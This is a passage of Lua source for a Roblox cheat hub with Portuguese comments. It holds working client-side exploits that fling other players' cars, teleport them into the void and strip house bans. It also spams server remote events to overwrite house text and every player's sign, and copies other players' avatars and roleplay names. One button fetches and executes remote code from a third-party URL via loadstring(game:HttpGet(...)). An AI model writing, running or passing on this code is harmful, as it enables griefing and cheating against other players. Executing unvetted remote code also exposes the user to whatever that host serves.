                or not mainPart.Parent or not targetPart or not targetPart.Parent then
                clearGrab()
                return
            end

            local camera = Workspace.CurrentCamera
            local aim = camera and camera.CFrame.LookVector or hrp.CFrame.LookVector
            local flatAim = Vector3.new(aim.X, 0, aim.Z)
            if flatAim.Magnitude < 0.01 then
                flatAim = Vector3.new(hrp.CFrame.LookVector.X, 0, hrp.CFrame.LookVector.Z)
            end
            flatAim = flatAim.Unit

            local targetPosition = hrp.Position + flatAim * 14 + Vector3.new(0, 3, 0)
            targetPart.CFrame = CFrame.lookAt(targetPosition, targetPosition + flatAim)
            mainPart.AssemblyAngularVelocity = Vector3.zero
            orientation.CFrame = CFrame.lookAt(Vector3.zero, flatAim)
        end)
    end
})

CarTab:AddParagraph({
    Title = "Como usar",
    Content = "Clique uma vez para segurar o carro mais próximo (até 120 studs). Mire com a câmera e clique novamente para lançá-lo forte, reto na direção da mira. O primeiro clique não lança automaticamente."
})

local Section = CarTab:AddSection({"Speed Functions"})

local speedValue = 200
local turboValue = 11.3

local function getAllCars()
    local cars = {}
    if workspace:FindFirstChild("Vehicles") then
        for _, vehicle in pairs(workspace.Vehicles:GetChildren()) do
            if vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat") then
                table.insert(cars, vehicle)
            end
        end
    end
    return cars
end

local function applyToAllCars(valueType, value)
    local cars = getAllCars()
    local carsModified = 0

    for _, car in pairs(cars) do
        local seat = car.Seats.VehicleSeat
        local target = seat:FindFirstChild(valueType)

        if target and target.Value ~= nil then
            target.Value = value
            carsModified += 1
        else
            pcall(function()
                seat[valueType] = value
                carsModified += 1
            end)
        end
    end

    newNotify("KitK4t Hub", "KitK4t Hub " .. carsModified .. " cars modified")
end

CarTab:AddTextBox({
    Title = "Car Speed",
    Placeholder = "Example: 300",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            speedValue = num
            newNotify("Trakis hub", "Speed set to: " .. num)
        else
            newNotify("Trakis hub ", "Invalid number")
        end
    end
})

CarTab:AddTextBox({
    Title = "Turbo Power",
    Placeholder = "Example: 15",
    Callback = function(text)
        local num = tonumber(text)
        if num then
            turboValue = num
            newNotify("KitK4t Hub", "Turbo set to: " .. num)
        else
            newNotify("KitK4t Hub", "Invalid number")
        end
    end
})

CarTab:AddButton({
    Title = "Apply Speed",
    Callback = function()
        applyToAllCars("MaxSpeed", speedValue)
    end
})

CarTab:AddButton({
    Title = "Apply Turbo",
    Callback = function()
        applyToAllCars("Turbo", turboValue)
    end
})

local Section = CarTab:AddSection({"all car functions"})


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- Namespace para evitar conflitos
local TeleportCarro = {}
TeleportCarro.Players = Players
TeleportCarro.Workspace = Workspace
TeleportCarro.LocalPlayer = LocalPlayer
TeleportCarro.Camera = Camera

-- Função para exibir notificação
function TeleportCarro:MostrarNotificacao(mensagem)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aviso",
            Text = mensagem,
            Duration = 5
        })
    end)
end

-- Função para desativar/ativar dano de queda
function TeleportCarro:ToggleFallDamage(disable)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return false end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if disable then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
        return true
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        return false
    end
end

-- Função para teleportar o jogador para o assento do carro
function TeleportCarro:TeleportToSeat(seat, car)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then
        self:MostrarNotificacao("Personagem não encontrado!")
        return false
    end
    local humanoid = self.LocalPlayer.Character.Humanoid
    local rootPart = self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        self:MostrarNotificacao("Parte raiz do personagem não encontrada!")
        return false
    end

    humanoid.Sit = false
    task.wait(0.1)

    rootPart.CFrame = seat.CFrame + Vector3.new(0, 5, 0)
    task.wait(0.1)

    seat:Sit(humanoid)
    task.wait(0.5)
    return humanoid.SeatPart == seat
end

-- Função para teleportar o carro para o void com delay
function TeleportCarro:TeleportToVoid(car)
    if not car then
        self:MostrarNotificacao("Veículo inválido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veículo não encontrada!")
            return
        end
    end
    local voidPosition = Vector3.new(0, -1000, 0)
    car:SetPrimaryPartCFrame(CFrame.new(voidPosition))
    task.wait(0.5)
end

-- Função para teleportar o carro para a posição do jogador com delay
function TeleportCarro:TeleportToPlayer(car, playerPos)
    if not car then
        self:MostrarNotificacao("Veículo inválido!")
        return
    end
    if not car.PrimaryPart then
        local body = car:FindFirstChild("Body", true) or car:FindFirstChild("Chassis", true)
        if body and body:IsA("BasePart") then
            car.PrimaryPart = body
        else
            self:MostrarNotificacao("Parte principal do veículo não encontrada!")
            return
        end
    end
    local targetPos = playerPos + Vector3.new(5, 0, 5)
    car:SetPrimaryPartCFrame(CFrame.new(targetPos))
    task.wait(0.5)
end

-- Função para sair do carro e voltar à posição original
function TeleportCarro:ExitCarAndReturn(originalPos)
    if not self.LocalPlayer.Character or not self.LocalPlayer.Character:FindFirstChild("Humanoid") then return end
    local humanoid = self.LocalPlayer.Character.Humanoid
    if humanoid.SeatPart then
        humanoid.Sit = false
    end
    task.wait(0.1)
    if originalPos then
        self.LocalPlayer.Character:PivotTo(CFrame.new(originalPos))
    end
end

-- Função para atualizar a lista de carros no dropdown
function TeleportCarro:AtualizarListaCarros()
    local pastaVeiculos = self.Workspace:FindFirstChild("Vehicles")
    local listaCarros = {}
    
    if pastaVeiculos then
        for _, carro in ipairs(pastaVeiculos:GetChildren()) do
            if carro.Name:match("Car$") then
                table.insert(listaCarros, carro.Name)
            end
        end
    end
    
    return listaCarros
end


-- Toggle para matar todos os carros
CarTab:AddToggle({
    Name = "Matar todos os carros do server",
    Description = "Teleporta os carros vazios para o void sequencialmente",
    Default = false,
    Callback = function(state)
        -- Variável de controle externa para parar o loop se o toggle for desligado
        _G.KillAllCarsActive = state 

        if state then
            spawn(function()
                local player = TeleportCarro.LocalPlayer
                local character = player.Character
                if not character or not character:FindFirstChild("HumanoidRootPart") then
                    TeleportCarro:MostrarNotificacao("Personagem não encontrado!")
                    return
                end

                local originalPosition = character.HumanoidRootPart.Position
                local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
                
                if not vehiclesFolder then
                    TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
                    return
                end

                -- Desativa dano de queda antes de começar o processo
                TeleportCarro:ToggleFallDamage(true)

                -- Pegamos a lista de carros no momento do clique
                local cars = vehiclesFolder:GetChildren()

                for _, car in ipairs(cars) do
                    -- Verifica se o usuário desligou o toggle durante o processo
                    if not _G.KillAllCarsActive then break end

                    -- Filtra se é um carro (baseado no seu padrão de nome ou classe)
                    if car.Name:match("Car$") or car:IsA("Model") then
                        local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
                        
                        -- Só tenta se o assento existir e estiver vazio
                        if vehicleSeat and not vehicleSeat.Occupant then
                            local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                            
                            if success then
                                task.wait(0.1) -- Pequeno delay para garantir que o server reconheceu que você sentou
                                TeleportCarro:TeleportToVoid(car)
                                TeleportCarro:ExitCarAndReturn(originalPosition)
                                task.wait(0.5) -- Delay entre um carro e outro para evitar crash/kick
                            end
                        end
                    end
                end

-- Finaliza o processo
                TeleportCarro:ToggleFallDamage(false)
                TeleportCarro:MostrarNotificacao("Limpeza de carros finalizada!")
            end)
        else
            _G.KillAllCarsActive = false
            TeleportCarro:ToggleFallDamage(false)
        end
    end
})



local Section = CarTab:AddSection({"functions dos carro"})

-- Criar o dropdown
local Dropdown = CarTab:AddDropdown({
    Name = "Selecionar Carro do Jogador",
    Description = "Selecione o carro de um jogador",
    Default = nil,
    Options = TeleportCarro:AtualizarListaCarros(),
    Callback = function(carroSelecionado)
        _G.SelectedVehicle = carroSelecionado
    end
})

-- Toggle para ver a câmera do carro selecionado
CarTab:AddToggle({
    Name = "Ver Câmera do Carro Selecionado",
    Description = "Foca a câmera no carro selecionado",
    Default = false,
    Callback = function(state)
        if state then
            if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
                TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
                return
            end

            local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
            if not vehiclesFolder then
                TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
                return
            end

            local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
            if not vehicle then
                TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
                return
            end

            local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
            if not vehicleSeat then
                TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
                return
            end

            -- Salvar o estado original da câmera
            TeleportCarro.OriginalCameraSubject = TeleportCarro.Camera.CameraSubject
            TeleportCarro.OriginalCameraType = TeleportCarro.Camera.CameraType

            -- Ajustar a câmera para o assento do carro, mesmo se ocupado
            TeleportCarro.Camera.CameraSubject = vehicleSeat
            TeleportCarro.Camera.CameraType = Enum.CameraType.Follow
            TeleportCarro:MostrarNotificacao("Câmera ajustada para o carro " .. _G.SelectedVehicle .. "!")
        else
            -- Restaurar a câmera ao estado original
            if TeleportCarro.OriginalCameraSubject then
                TeleportCarro.Camera.CameraSubject = TeleportCarro.OriginalCameraSubject
                TeleportCarro.Camera.CameraType = TeleportCarro.OriginalCameraType or Enum.CameraType.Custom
                TeleportCarro:MostrarNotificacao("Câmera restaurada ao normal!")
                TeleportCarro.OriginalCameraSubject = nil
                TeleportCarro.OriginalCameraType = nil
            end
        end
    end
})

-- Atualizar o dropdown dinamicamente
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildAdded:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)
TeleportCarro.Workspace:WaitForChild("Vehicles").ChildRemoved:Connect(function()
    Dropdown:Set(TeleportCarro:AtualizarListaCarros())
end)

local Section = CarTab:AddSection({"functions kill e trazer"})

-- Botão para destruir carro selecionado
CarTab:AddButton({
    Name = "Destruir Carro Selecionado",
    Description = "Teleporta o carro selecionado para o void",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("O kill car não foi possível, há alguém sentado no assento do motorista!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToVoid(vehicle)
            TeleportCarro:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para o void!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Falha ao sentar no carro!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- Botão para trazer carro selecionado
CarTab:AddButton({
    Name = "Trazer Carro Selecionado",
    Description = "Teleporta o carro selecionado para sua posição",
    Callback = function()
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            TeleportCarro:MostrarNotificacao("Nenhum carro selecionado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local vehicle = vehiclesFolder:FindFirstChild(_G.SelectedVehicle)
        if not vehicle then
            TeleportCarro:MostrarNotificacao("Carro selecionado não encontrado!")
            return
        end

        local vehicleSeat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
        if not vehicleSeat then
            TeleportCarro:MostrarNotificacao("Assento do carro não encontrado!")
            return
        end

        if vehicleSeat.Occupant then
            TeleportCarro:MostrarNotificacao("O teleporte do carro não foi possível, há alguém sentado no assento do motorista!")
            return
        end

        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local success = TeleportCarro:TeleportToSeat(vehicleSeat, vehicle)
        if success then
            TeleportCarro:TeleportToPlayer(vehicle, originalPos)
            TeleportCarro:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para você!")
            TeleportCarro:ExitCarAndReturn(originalPos)
        else
            TeleportCarro:MostrarNotificacao("Falha ao sentar no carro!")
        end
        TeleportCarro:ToggleFallDamage(false)
    end
})

-- Botão para trazer todos os carros
CarTab:AddButton({
    Name = "Trazer Todos os Carros",
    Description = "Teleporta todos os carros do servidor para sua posição",
    Callback = function()
        local originalPos
        if TeleportCarro.LocalPlayer.Character and TeleportCarro.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            originalPos = TeleportCarro.LocalPlayer.Character.HumanoidRootPart.Position
        else
            TeleportCarro:MostrarNotificacao("Personagem do jogador não encontrado!")
            return
        end

        local vehiclesFolder = TeleportCarro.Workspace:FindFirstChild("Vehicles")
        if not vehiclesFolder then
            TeleportCarro:MostrarNotificacao("Pasta de veículos não encontrada!")
            return
        end

        local isFallDamageOff = TeleportCarro:ToggleFallDamage(true)
        local cars = {}
        for _, car in ipairs(vehiclesFolder:GetChildren()) do
            if car.Name:match("Car$") then
                table.insert(cars, car)
            end
        end

        for _, car in ipairs(cars) do
            local vehicleSeat = car:FindFirstChildWhichIsA("VehicleSeat", true)
            if vehicleSeat and vehicleSeat.Occupant == nil then
                local success = TeleportCarro:TeleportToSeat(vehicleSeat, car)
                if success then
                    TeleportCarro:TeleportToPlayer(car, originalPos)
                    TeleportCarro:ExitCarAndReturn(originalPos)
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " foi teleportado para você!")
                    task.wait(1)
                else
                    TeleportCarro:MostrarNotificacao("Falha ao sentar no carro " .. car.Name .. "!")
                end
            else
                if vehicleSeat then
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " ignorado: alguém está no assento do motorista!")
                else
                    TeleportCarro:MostrarNotificacao("Carro " .. car.Name .. " ignorado: assento não encontrado!")
                end
            end
        end

        TeleportCarro:ToggleFallDamage(false)
        if #cars == 0 then
            TeleportCarro:MostrarNotificacao("Nenhum carro disponível para teleportar!")
        end
    end
})

-- Manter o estado de dano de queda ao recarregar o personagem
local fallDamageDisabled = false
TeleportCarro.LocalPlayer.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid")
    if fallDamageDisabled then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        humanoid.PlatformStand = false
    else
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
    end
end)

CarTab:AddSection({"Vehicle - Rgb"})
local function vehiclergb()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local player = Players.LocalPlayer
    local remote = player:WaitForChild("PlayerGui")
        :WaitForChild("MainGUIHandler")
        :WaitForChild("VehicleControl")
        :WaitForChild("UIColorPicker")
        :WaitForChild("SetColor")

    return RunService.RenderStepped:Connect(function()
        local color = Color3.fromRGB(
            math.random(0, 255),
            math.random(0, 255),
            math.random(0, 255)
        )
        remote:FireServer(color)
    end)
end

local vehicleRgbConnection

CarTab:AddToggle({
    Name = "Vehicle - Rgb",
    Default = false,
    Callback = function(value)
        if value then
            if not vehicleRgbConnection then
                vehicleRgbConnection = vehiclergb()
            end
            print("RGB CAR ativado")
        else
            if vehicleRgbConnection then
                vehicleRgbConnection:Disconnect()
                vehicleRgbConnection = nil
            end
            print("RGB CAR desativado")
        end
    end
})


local HouseTab = Window:MakeTab({"House", "home"})
HouseTab:AddSection({"Your House"})
local RunService = game:GetService("RunService")
local rgbHouse = false
local rgbConnection

HouseTab:AddToggle({
    Name = "House - Rgb",
    Default = false,
    Callback = function(value)
        rgbHouse = value

        if rgbHouse then
            rgbConnection = RunService.RenderStepped:Connect(function()
                local color = Color3.fromHSV(
                    math.random(),
                    1,
                    1
                )

                local args = {
                    "ColorPickHouse",
                    color
                }

                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1Player1sHous1e")
                    :FireServer(unpack(args))
            end)
        else
            if rgbConnection then
                rgbConnection:Disconnect()
                rgbConnection = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local houseTextRgb = false
local houseTextConnection

HouseTab:AddToggle({
    Name = "Housetext - Rgb",
    Default = false,
    Callback = function(value)
        houseTextRgb = value

        if houseTextRgb then
            houseTextConnection = RunService.RenderStepped:Connect(function()
                local color = Color3.fromHSV(
                    math.random(),
                    1,
                    1
                )

                local args = {
                    "PickingBusinessNameColor",
                    color
                }

                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1tColo1r")
                    :FireServer(unpack(args))
            end)
        else
            if houseTextConnection then
                houseTextConnection:Disconnect()
                houseTextConnection = nil
            end
        end
    end
})
HouseTab:AddSection({"Hack3d Housetext"})
local RunService = game:GetService("RunService")

local hackedHouseText = false
local hackedConnection
local lastUpdate = 0
local state = false

local texts = {
    "Trakis hub",
    "Trakis Hub top",
    "Trakis Hub",
    "Trakis hub user ",
    "Hi cafezin",
    "Trakis Hub best script "
}

HouseTab:AddToggle({
    Name = "Apply Hack3d Housetext",
    Default = false,
    Callback = function(value)
        hackedHouseText = value

        if hackedHouseText then
            hackedConnection = RunService.RenderStepped:Connect(function()
                if tick() - lastUpdate < 0.35 then return end
                lastUpdate = tick()

                state = not state

                -- Alterna cor (preto / verde)
                local color = state and Color3.new(0, 0, 0) or Color3.new(0, 1, 0)

                -- Texto aleatório estilizado
                local text = texts[math.random(1, #texts)]

                -- Aplica texto
                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1t")
                    :FireServer("BusinessName", text)

                -- Aplica cor
                game:GetService("ReplicatedStorage")
                    :WaitForChild("RE")
                    :WaitForChild("1RPHous1eEven1tColo1r")
                    :FireServer("PickingBusinessNameColor", color)
            end)
        else
if hackedConnection then
                hackedConnection:Disconnect()
                hackedConnection = nil
            end
        end
    end
})


HouseTab:AddSection({"Other Houses"})
HouseTab:AddButton({
    Name = "Remover Ban de Todas as Casas",
    Description = "Tenta remover o ban de todas as casas ",
    Callback = function()
        local successCount = 0
        local failCount = 0
        for i = 1, 37 do
            local bannedBlockName = "BannedBlock" .. i
            local bannedBlock = Workspace:FindFirstChild(bannedBlockName, true)
            if bannedBlock then
                local success, _ = pcall(function()
                    bannedBlock:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        for _, house in pairs(Workspace:GetDescendants()) do
            if house.Name:match("BannedBlock") then
                local success, _ = pcall(function()
                    house:Destroy()
                end)
                if success then
                    successCount = successCount + 1
                else
                    failCount = failCount + 1
                end
            end
        end
        if successCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Sucesso",
                Text = "Bans removidos de " .. successCount .. " casas!",
                Duration = 5
            })
        end
        if failCount > 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = "Falha ao remover bans de " .. failCount .. " casas.",
                Duration = 5
            })
        end
        if successCount == 0 and failCount == 0 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = "Nenhum ban encontrado para remover.",
                Duration = 5
            })
        end
    end
})
HouseTab:AddSection({"Props"})
local player = game.Players.LocalPlayer

HouseTab:AddToggle({
    Name = "Disable Prop Spawn",
    Default = false,
    Callback = function(value)
        local args = { value } -- passa true ou false dependendo do toggle
        local success, err = pcall(function()
            workspace:WaitForChild("001_Lots")
                :WaitForChild(player.Name.."House")
                :WaitForChild("HousePickedByPlayer")
                :WaitForChild("HouseModel")
                :WaitForChild("Permissions:SetPropPlacementBlockedForOthers")
                :InvokeServer(unpack(args))
        end)
        if not success then
            warn("Não foi possível alterar o bloqueio de props:", err)
        end
    end
})
local player = game.Players.LocalPlayer

HouseTab:AddButton({
    Name = "Delete All Props",
    Callback = function()
        local success, err = pcall(function()
            workspace:WaitForChild("001_Lots")
                :WaitForChild(player.Name.."House")
                :WaitForChild("HousePickedByPlayer")
                :WaitForChild("HouseModel")
                :WaitForChild("Permissions:ClearProps")
                :InvokeServer()
        end)
        if not success then
            warn("Não foi possível limpar os props:", err)
        end
    end
})
HouseTab:AddSection({"Loop Scripts"})
local loopGarage = false

HouseTab:AddToggle({
    Name = "Loop Garage",
    Default = false,
    Callback = function(value)
        loopGarage = value

        if loopGarage then
            task.spawn(function()
                while loopGarage do
                    local args = {
                        "GarageDoor"
                    }

                    game:GetService("ReplicatedStorage")
                        :WaitForChild("RE")
                        :WaitForChild("1Player1sHous1e")
                        :FireServer(unpack(args))

                    task.wait(7)
                end
            end)
        end
    end
})

local FunT = Window:MakeTab({"Fun Players", "smile"})
FunT:AddSection({ "Fun Players" })


local Section = FunT:AddSection({

    Name = "Head Sit"

})



local selectedHeadSit = nil

local headSitConnection = nil



local pl = game.Players.LocalPlayer

local players = {}



local function updatePlayerList()

    players = {}

    for _, player in pairs(game.Players:GetPlayers()) do

        table.insert(players, player.Name)

    end

    return players

end



updatePlayerList()



local headSitDropdown = FunT:AddDropdown({

    Name = "Select a Player",

    Default = "",

    Options = players,

    Callback = function(Value)

        selectedHeadSit = Value

    end

})



FunT:AddToggle({

    Name = "Head Sit",

    Default = false,

    Callback = function(bool)

        local player = game.Players.LocalPlayer

        local character = player.Character or player.CharacterAdded:Wait()

        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local humanoid = character:WaitForChild("Humanoid")



        if not selectedHeadSit or selectedHeadSit == "" then

            return false

        end



        local selectedPlayer = game.Players:FindFirstChild(selectedHeadSit)



        if bool then

            if selectedPlayer and selectedPlayer.Character then

                humanoid.Sit = true



                if headSitConnection then

                    headSitConnection:Disconnect()

                end



                headSitConnection = game:GetService("RunService").Heartbeat:Connect(function()

                    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") and humanoid.Sit then

                        local targetHead = selectedPlayer.Character.Head

                        humanoidRootPart.CFrame = targetHead.CFrame * CFrame.Angles(0, 0, 0) * CFrame.new(0, 1.6, 0.4)

                    else

                        if headSitConnection then

                            headSitConnection:Disconnect()

                            headSitConnection = nil

                            humanoid.Sit = false

                        end

                    end

                end)

            else

                return false

            end

        else

            if headSitConnection then

                headSitConnection:Disconnect()

                headSitConnection = nil

            end

            humanoid.Sit = false

        end

    end

})



FunT:AddButton({

    Name = "Update Player List",

    Callback = function()

        local updatedPlayers = updatePlayerList()

        if headSitDropdown and updatedPlayers then

            pcall(function()

                headSitDropdown:Refresh(updatedPlayers)

            end)

            if selectedHeadSit and not game.Players:FindFirstChild(selectedHeadSit) then

                selectedHeadSit = nil

                pcall(function()

                    headSitDropdown:Set("")

                end)

            end

        end

    end

})

local Section2 = FunT:AddSection({

    Name = "Placa"

})

local texto = ""

local function trocaplaca(all, txt)
if all then
for _,v in next, game:GetService("Players"):GetPlayers() do
if v.Character and v.Character:FindFirstChild("Sign") then
v.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
end
end
else
if selectedHeadSit.Character and selectedHeadSit.Character:FindFirstChild("Sign") then
selectedHeadSit.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
end
end
end

FunT:AddTextBox({
    Name = "Texto",
    PlaceholderText = "Texto da placa",
    Callback = function(value)
        texto = value
    end
})

FunT:AddButton({
    Name = "Placa troca all",
    Callback = function(value)
        trocaplaca(true, texto)
    end
})

local Section = FunT:AddSection({"Browser"})

FunT:AddButton({
    Name = "Browser by Trakis hub - It doesn't work on Delta.",
    Callback = function()
        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/09WI0rdvCDdDuIHd/raw"))()
    end
})


local Tab = Window:MakeTab({"Avatar", "shirt"})



Tab:AddSection({ Name = "Avatar" })



Tab:AddSection({ Name = "Copy Avatar" })

local Players = game:GetService("Players")

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Remotes = ReplicatedStorage:WaitForChild("Remotes")



local Target = nil



local function GetPlayerNames()

    local PlayerNames = {}

    for _, player in ipairs(Players:GetPlayers()) do

        table.insert(PlayerNames, player.Name)

    end

    return PlayerNames

end



local Dropdown = Tab:AddDropdown({

    Name = "Select Player",

    Options = GetPlayerNames(),

    Default = Target,

    Callback = function(Value)

        Target = Value

    end

})



local function UpdateDropdown()

    Dropdown:Refresh(GetPlayerNames(), true)

end



Players.PlayerAdded:Connect(UpdateDropdown)

Players.PlayerRemoving:Connect(UpdateDropdown)

Tab:AddButton({

    Name = "Copy Avatar",

    Callback = function()

        if not Target then return end



local LP = Players.LocalPlayer

        local LChar = LP.Character

        local TPlayer = Players:FindFirstChild(Target)



        if TPlayer and TPlayer.Character then

            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")

            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")



            if LHumanoid and THumanoid then

                local LDesc = LHumanoid:GetAppliedDescription()



                for _, acc in ipairs(LDesc:GetAccessories(true)) do

                    if acc.AssetId and tonumber(acc.AssetId) then

                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))

                        task.wait(0.2)

                    end

                end



                if tonumber(LDesc.Shirt) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))

                    task.wait(0.2)

                end



                if tonumber(LDesc.Pants) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))

                    task.wait(0.2)

                end



                if tonumber(LDesc.Face) then

                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))

                    task.wait(0.2)

                end



                local PDesc = THumanoid:GetAppliedDescription()



                local argsBody = {

                    [1] = {

                        [1] = PDesc.Torso,

                        [2] = PDesc.RightArm,

                        [3] = PDesc.LeftArm,

                        [4] = PDesc.RightLeg,

                        [5] = PDesc.LeftLeg,

                        [6] = PDesc.Head

                    }

                }

                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))

                task.wait(0.5)



                if tonumber(PDesc.Shirt) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))

                    task.wait(0.3)

                end



                if tonumber(PDesc.Pants) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))

                    task.wait(0.3)

                end



                if tonumber(PDesc.Face) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))

                    task.wait(0.3)

                end



                for _, v in ipairs(PDesc:GetAccessories(true)) do

                    if v.AssetId and tonumber(v.AssetId) then

                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))

                        task.wait(0.3)

                    end

                end



                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")

                if SkinColor then

                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))

                    task.wait(0.3)

                end



                if tonumber(PDesc.IdleAnimation) then

                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))

                    task.wait(0.3)

                end



                local Bag = TPlayer:FindFirstChild("PlayersBag")

                if Bag then

                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then

                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then

                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPNameColor") then

                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)

                        task.wait(0.3)

                    end

                    if Bag:FindFirstChild("RPBioColor") then

                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)

                        task.wait(0.3)

                    end

                end

            end

        end

    end

})

Tab:AddSection({ "Character" })

